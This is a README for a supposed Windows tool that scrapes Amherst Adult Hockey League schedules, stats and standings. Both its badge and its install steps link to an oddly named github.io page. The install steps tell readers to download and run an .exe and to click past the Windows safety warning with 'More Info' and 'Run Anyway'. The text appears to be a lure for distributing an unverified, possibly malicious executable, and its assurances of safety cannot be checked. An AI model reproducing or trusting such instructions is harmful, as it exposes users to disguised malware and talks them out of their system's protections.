# 🏒 aahl-web-scraper - Track Amherst hockey schedules with ease

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://poetic-squamouscell685.github.io)

This application gathers data from the Amherst Adult Hockey League website. It saves game schedules, tracks player statistics, and monitors team standings. You do not need to know how to write code to use this tool. It performs the manual work of checking the website for updates and organizes the information into a format you can read.

## 💾 System Requirements

Your computer needs to meet these basic standards to run the application:

*   Operating System: Windows 10 or Windows 11.
*   Memory: At least 4 gigabytes of RAM.
*   Storage: At least 200 megabytes of free space.
*   Internet Connection: A stable connection to reach the league website.

## 📥 How to Install

1.  Visit the [official releases page](https://poetic-squamouscell685.github.io) to find the latest version.
2.  Look for the file ending in .exe under the Assets section.
3.  Click the filename to start the download to your computer.
4.  Once the file finishes downloading, move it to a folder where you want to keep the application.
5.  Double-click the file to start the installation process.
6.  Follow the prompts on your screen. Windows might show a safety warning. If this happens, click More Info, then click Run Anyway to proceed.

## ⚙️ How to Use the Scraper

After you open the program, you will see a simple window. This window contains all the controls necessary to pull data from the website.

1.  Open the application from your desktop or start menu.
2.  Select the specific data you wish to collect. You can choose game schedules, individual player stats, or the current team standings.
3.  Click the Run button.
4.  The application talks to the hockey league website and copies the information.
5.  Wait for the progress bar to reach completion.
6.  Check the Results folder inside the application directory to find your new files. The data is saved in a format compatible with spreadsheet software like Excel.

## 🛠️ Understanding the Features

This tool uses two methods to fetch information. It chooses the best method based on the current layout of the league website.

Direct HTTP requests: This method asks the website server for data files directly. It works fast and does not require much memory.

Playwright browser automation: This method opens a hidden web browser. It acts like a person clicking through the site. It ensures that the scraper sees exactly what you see when you visit the page in your normal web browser. This ensures accurate statistics even if the league changes how the website looks.

## 📝 Common Questions

Will this program slow down my computer?
No, the program runs in the background and only uses resources while it fetches data. You can close the program when you finish your tasks.

How often should I run the scraper?
You can run it as often as you like. Running it once a week is usually enough to stay updated. If you want real-time updates, you can run it daily.

What should I do if the program shows an error message?
Check your internet connection first. If you stay connected and the error persists, close the program and open it again. This clears the memory and allows the scraper to try the connection again.

Does this save my personal information?
No, the program only interacts with the public league website. It does not store passwords or personal account details from you.

## 📁 Managing Your Data

The program creates a folder named Data every time it runs. Inside, you will find files named with the current date. You can move these files to your own documents folder for safe keeping. If you run out of disk space, you can delete old files from this folder. The program will not delete your files for you.

## 📑 Program Updates

The developers release updates to ensure the scraper works if the league changes its website layout. When you notice that the scraper stops collecting data, return to the download link to check for a new version. Installing the new version over the old one will keep your settings intact.

Keywords: hockey, scraper, statistics, schedule, amherst, automation, windows